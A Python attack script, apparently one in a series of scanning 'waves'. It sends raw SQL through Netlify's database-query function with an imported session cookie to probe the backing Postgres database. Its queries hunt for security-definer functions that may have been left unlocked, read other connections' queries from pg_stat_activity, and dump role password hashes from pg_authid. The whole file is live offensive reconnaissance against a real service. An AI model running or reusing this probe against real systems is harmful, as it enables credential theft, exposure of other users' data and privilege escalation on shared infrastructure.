# -*- coding: utf-8 -*-
"""波12:组合攻击面审计(多函数/多对象串联)
C1 已装扩展全表(pg_cron/pg_net?) / C2 cron schema / C3 pg_net schema
C4 cloud_admin 全部函数+ACL(找漏锁 prosecdef) / C5 pg_stat_activity 其他连接
C6 pg_authid 可读性 / C7 neon 扩展全部函数签名
"""
import http.client, ssl, gzip, brotli, json, sys, time
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_NET

SITE_ID = '04f08ff6-f274-47ac-b6d7-5fb1e055f3b4'
ctx = ssl.create_default_context()
P = '/.netlify/functions/database-query'


def q(sql, timeout=90):
    t0 = time.time()
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=timeout)
    h = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0',
         'Accept-Encoding': 'br, gzip', 'Accept': 'application/json', 'Cookie': COOKIE_NET,
         'Content-Type': 'application/json'}
    body = {'siteId': SITE_ID, 'action': 'query', 'sql': sql}
    conn.request('POST', P, body=json.dumps(body).encode(), headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br':
        raw = brotli.decompress(raw)
    elif enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    conn.close()
    return st, raw[:4000].decode('utf-8', 'ignore'), round(time.time() - t0, 1)


tests = [
    ('C1_installed_ext', "select extname, extowner::regrole::text, extversion from pg_extension order by extname"),
    ('C2_cron_schema',   "select schema_name from information_schema.schemata where schema_name like '%cron%' or schema_name like '%net%'"),
    ('C3_cron_job_tbl',  "select to_regclass('cron.job') as cron_job, to_regclass('net._http_response') as net_http"),
    ('C4a_ca_funcs',     "select p.proname, p.prosecdef, pg_get_function_identity_arguments(p.oid) as args, "
                         "coalesce(array_to_string(p.proacl::text[], ','), 'NULL') as acl "
                         "from pg_proc p join pg_roles r on p.proowner = r.oid "
                         "where r.rolname = 'cloud_admin' and p.prolang <> 12 order by p.proname"),
    ('C4b_pub_exec',     "select n.nspname, p.proname, p.prosecdef, pg_get_function_identity_arguments(p.oid) as args "
                         "from pg_proc p join pg_namespace n on p.pronamespace = n.oid "
                         "where p.prosecdef and has_function_privilege(current_user, p.oid, 'EXECUTE') "
                         "and n.nspname not in ('pg_catalog', 'information_schema') "
                         "order by n.nspname, p.proname"),
    ('C5_activity',      "select usename, application_name, client_addr::text, state, left(query, 80) as q from pg_stat_activity where pid <> pg_backend_pid()"),
    ('C6_authid',        "select rolname, left(rolpassword, 30) as pwhash from pg_authid"),
    ('C7_neon_funcs',    "select proname, prosecdef, pg_get_function_identity_arguments(oid) as args "
                         "from pg_proc where pronamespace in (select oid from pg_namespace where nspname in ('neon', 'neon_utils')) "
                         "order by pronamespace, proname"),
]
for label, sql in tests:
    s, b, dt = q(sql)
    print('%-16s [%d] %.1fs' % (label, s, dt))
    print('   ' + b[:3000].replace('\n', ' '))
    print()
